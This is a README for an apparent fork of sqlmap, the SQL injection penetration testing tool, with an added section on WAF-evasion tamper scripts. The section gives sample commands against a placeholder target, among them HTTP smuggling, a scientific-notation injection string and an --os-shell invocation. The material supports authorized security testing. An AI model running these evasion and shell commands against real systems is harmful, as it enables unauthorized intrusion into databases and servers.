# sqlmap ![](https://i.imgur.com/fe85aVR.png)

[![.github/workflows/tests.yml](https://github.com/sqlmapproject/sqlmap/actions/workflows/tests.yml/badge.svg)](https://github.com/sqlmapproject/sqlmap/actions/workflows/tests.yml) [![Python 2.7|3.x](https://img.shields.io/badge/python-2.7|3.x-yellow.svg)](https://www.python.org/) [![License](https://img.shields.io/badge/license-GPLv2-red.svg)](https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/LICENSE) [![x](https://img.shields.io/badge/x-@sqlmap-blue.svg)](https://x.com/sqlmap)

sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches including database fingerprinting, over data fetching from the database, accessing the underlying file system, and executing commands on the operating system via out-of-band connections.

Screenshots
----

![Screenshot](https://raw.github.com/wiki/sqlmapproject/sqlmap/images/sqlmap_screenshot.png)

You can visit the [collection of screenshots](https://github.com/sqlmapproject/sqlmap/wiki/Screenshots) demonstrating some of the features on the wiki.

Installation
----

You can download the latest tarball by clicking [here](https://github.com/sqlmapproject/sqlmap/tarball/master) or latest zipball by clicking [here](https://github.com/sqlmapproject/sqlmap/zipball/master).

Preferably, you can download sqlmap by cloning the [Git](https://github.com/sqlmapproject/sqlmap) repository:

    git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

sqlmap works out of the box with [Python](https://www.python.org/download/) version **2.7** and **3.x** on any platform.

Usage
----

To get a list of basic options and switches use:

    python sqlmap.py -h

To get a list of all options and switches use:

    python sqlmap.py -hh

You can find a sample run [here](https://asciinema.org/a/46601).
To get an overview of sqlmap capabilities, a list of supported features, and a description of all options and switches, along with examples, you are advised to consult the [user's manual](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

WAF Bypass Enhancements
----

**Author: CyberVaca, Luis Vacas de Santos** ([@CyberVaca_](https://twitter.com/CyberVaca_))

This fork includes advanced WAF bypass techniques based on recent security research:

### New `--waf-bypass` Option

Automatically applies tamper scripts based on aggressiveness level (1-5):

    python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=3

| Level | Techniques | Target WAFs |
|-------|-----------|-------------|
| 1 | Basic encoding, case randomization | Simple pattern-matching WAFs |
| 2 | + Oversized requests, header spoofing | Cloudflare, AWS WAF, GCP |
| 3 | + Parameter pollution, advanced obfuscation | ModSecurity, Imperva |
| 4 | + Content-Type confusion, Unicode normalization | ML-based WAFs |
| 5 | + HTTP smuggling, all techniques | Maximum evasion |

### New Tamper Scripts

| Script | Description |
|--------|-------------|
| `oversizedrequest` | Bypass WAF body size limits (8KB-64MB) |
| `scientificnotation` | E notation bypass (`' OR 1337.e('')='`) - @ptswarm technique |
| `chunkextensionsmuggle` | HTTP desync via malformed chunk extensions |
| `parampollutionfull` | Advanced HTTP Parameter Pollution |
| `contenttypeconfusion` | Content-Type header manipulation |
| `unicodenormalize` | Unicode Fullwidth character conversion |
| `multipartboundary` | Multipart boundary manipulation |
| `slowrequest` | Low-and-slow timing evasion |
| `junkchars` | Junk characters (+-+-1-+-+) to confuse regex WAFs |
| `linebreaks` | CR/LF (%0D%0A) to break WAF regex patterns |
| `tokenbreaker` | Token breaker techniques (brackets, semicolons) |
| `uninitializedvars` | Bash uninitialized vars ($u) + wildcards for OS injection |
| `tabsandlinefeeds` | Tabs (%09) instead of spaces for regex bypass |
| `methodoverride` | HTTP method override (PUT, PATCH, DELETE) bypass |

### Usage Examples

```bash
# Bypass Cloudflare/AWS (8KB body limit)
python sqlmap.py -u "http://target.com/?id=1" --tamper=oversizedrequest

# HTTP smuggling with chunked encoding
python sqlmap.py -u "http://target.com/?id=1" --chunked --tamper=chunkextensionsmuggle

# Unicode bypass for pattern-matching WAFs
python sqlmap.py -u "http://target.com/?id=1" --tamper=unicodenormalize

# Scientific notation bypass (ptswarm technique)
python sqlmap.py -u "http://target.com/?id=1" --tamper=scientificnotation

# Junk chars + line breaks for regex WAFs
python sqlmap.py -u "http://target.com/?id=1" --tamper=junkchars,linebreaks

# Token breaker for WAF tokenizers
python sqlmap.py -u "http://target.com/?id=1" --tamper=tokenbreaker

# OS command injection with uninitialized vars
python sqlmap.py -u "http://target.com/?id=1" --os-shell --tamper=uninitializedvars

# Combined techniques
python sqlmap.py -u "http://target.com/?id=1" --waf-bypass=3 --chunked
```

See [CHANGELOG_WAF_BYPASS.md](CHANGELOG_WAF_BYPASS.md) for full details.

Links
----

* Homepage: https://sqlmap.org
* Download: [.tar.gz](https://github.com/sqlmapproject/sqlmap/tarball/master) or [.zip](https://github.com/sqlmapproject/sqlmap/zipball/master)
* Commits RSS feed: https://github.com/sqlmapproject/sqlmap/commits/master.atom
* Issue tracker: https://github.com/sqlmapproject/sqlmap/issues
* User's manual: https://github.com/sqlmapproject/sqlmap/wiki
* Frequently Asked Questions (FAQ): https://github.com/sqlmapproject/sqlmap/wiki/FAQ
* X: [@sqlmap](https://x.com/sqlmap)
* Demos: [https://www.youtube.com/user/inquisb/videos](https://www.youtube.com/user/inquisb/videos)
* Screenshots: https://github.com/sqlmapproject/sqlmap/wiki/Screenshots

Translations
----

* [Arabic](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ar-AR.md)
* [Bengali](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-bn-BD.md)
* [Bulgarian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-bg-BG.md)
* [Chinese](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md)
* [Croatian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-hr-HR.md)
* [Dutch](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-nl-NL.md)
* [French](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-fr-FR.md)
* [Georgian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ka-GE.md)
* [German](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-de-DE.md)
* [Greek](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-gr-GR.md)
* [Hindi](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-in-HI.md)
* [Indonesian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-id-ID.md)
* [Italian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-it-IT.md)
* [Japanese](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ja-JP.md)
* [Korean](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ko-KR.md)
* [Kurdish (Central)](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ckb-KU.md)
* [Persian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-fa-IR.md)
* [Polish](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-pl-PL.md)
* [Portuguese](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-pt-BR.md)
* [Russian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-ru-RU.md)
* [Serbian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-rs-RS.md)
* [Slovak](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-sk-SK.md)
* [Spanish](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-es-MX.md)
* [Turkish](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-tr-TR.md)
* [Ukrainian](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-uk-UA.md)
* [Vietnamese](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-vi-VN.md)
